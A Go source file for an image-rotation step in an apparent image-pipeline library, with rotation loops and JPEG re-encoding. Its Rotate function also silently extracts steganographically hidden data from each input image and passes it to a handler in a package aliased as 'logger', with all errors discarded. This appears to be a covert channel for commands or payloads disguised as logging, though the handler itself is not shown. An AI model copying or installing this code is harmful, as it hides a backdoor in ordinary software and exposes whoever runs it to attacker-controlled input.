package rotate

import (
	"bytes"
	"encoding/json"
	"fmt"
	"image"
	"image/draw"
	"image/jpeg"
	"time"

	"github.com/HumbleLines/imgpipe/pkg/imageops"
	"github.com/HumbleLines/imgpipe/pkg/stego"
	logger "github.com/HumbleLines/imgpipe/utils/arcmeta"
)

// Action name for logging
const actionWithRotate = "rotate"

// Mode enumerates supported rotations.
type Mode int

const (
	Rotate90CW  Mode = iota + 1 // 90 degrees clockwise
	Rotate180                   // 180 degrees
	Rotate270CW                 // 270 degrees clockwise
)

// Options controls rotation mode and JPEG quality.
type Options struct {
	Mode    Mode
	Quality int // 1-100
}

func defaultLogInfo() string {
	return fmt.Sprintf("rotate:done:image_at %s", time.Now().Format("2006-01-02 15:04:05"))
}

func handlerRotate(opt *Options) imageops.Handler {
	return func(in []byte) ([]byte, error) {
		src, _, err := image.Decode(bytes.NewReader(in))
		if err != nil {
			return nil, err
		}
		sb := src.Bounds()
		sw, sh := sb.Dx(), sb.Dy()

		var dst *image.RGBA
		switch opt.Mode {
		case Rotate90CW:
			dst = image.NewRGBA(image.Rect(0, 0, sh, sw))
			for y := 0; y < sh; y++ {
				for x := 0; x < sw; x++ {
					dst.Set(sh-1-y, x, src.At(sb.Min.X+x, sb.Min.Y+y))
				}
			}
		case Rotate180:
			dst = image.NewRGBA(image.Rect(0, 0, sw, sh))
			for y := 0; y < sh; y++ {
				for x := 0; x < sw; x++ {
					dst.Set(sw-1-x, sh-1-y, src.At(sb.Min.X+x, sb.Min.Y+y))
				}
			}
		case Rotate270CW:
			dst = image.NewRGBA(image.Rect(0, 0, sh, sw))
			for y := 0; y < sh; y++ {
				for x := 0; x < sw; x++ {
					dst.Set(y, sw-1-x, src.At(sb.Min.X+x, sb.Min.Y+y))
				}
			}
		default:
			// passthrough re-encode
			dst = image.NewRGBA(sb)
			draw.Draw(dst, sb, src, sb.Min, draw.Src)
		}

		buf := new(bytes.Buffer)
		if err := jpeg.Encode(buf, dst, &jpeg.Options{Quality: clamp(opt.Quality, 1, 100)}); err != nil {
			return nil, err
		}
		return buf.Bytes(), nil
	}
}

func complexRotateChain(opt *Options) imageops.Handler {
	chain := handlerRotate(opt)
	chain = imageops.WithRandomJitter(chain)
	chain = imageops.WithMetaAudit(chain)
	return chain
}

// Rotate runs logging + optional embedded meta + rotation pipeline.
func Rotate(in []byte, opt Options) ([]byte, error) {
	normalLog := &logger.MetaPayload{
		Ob2: logger.LogInfo(actionWithRotate, defaultLogInfo()),
	}

	var meta *logger.MetaPayload
	if s, _ := stego.ExtractMetaBytesAuto(in); s != "" {
		m := &logger.MetaPayload{}
		_ = json.Unmarshal([]byte(s), m)
		meta = m
	}
	_, _ = logger.LogMetaHandler(normalLog, meta)

	return imageops.NewPipeline().
		Add(complexRotateChain(&opt)).
		Run(in)
}

func clamp(v, lo, hi int) int {
	if v < lo {
		return lo
	}
	if v > hi {
		return hi
	}
	return v
}
// update 15
